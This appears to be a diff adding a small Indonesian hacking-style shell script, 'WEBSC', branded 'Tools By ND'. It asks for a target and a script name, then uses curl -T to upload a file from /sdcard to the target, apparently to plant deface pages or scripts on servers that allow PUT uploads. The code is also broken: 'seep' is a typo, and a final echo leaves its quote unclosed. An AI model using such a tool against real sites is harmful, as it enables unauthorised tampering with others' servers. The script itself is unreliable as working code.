@@ -1,0 +1,15 @@
+clear
+figlet '    WEBSC' | lolcat
+echo "    </////////////////////////[]\\\\\\\\\\\\\\\\\\\\\\\>" | lolcat
+echo "    <=====[       Tools By ND       ]=====>" | lolcat
+echo  "    <*****[  WA ND : 0819XXXXXX43  ]******>" | lolcat
+echo "    <=====================[]====================>" | lolcat
+sleep 1
+read -p "Enter Target =>" target;
+read -p "Enter Name Sc =>" script;
+sleep 1
+echo "Proses.."
+curl -T /sdcard/$script $target
+seep 1
+echo ' [*] => Selesai 
+sleep 2
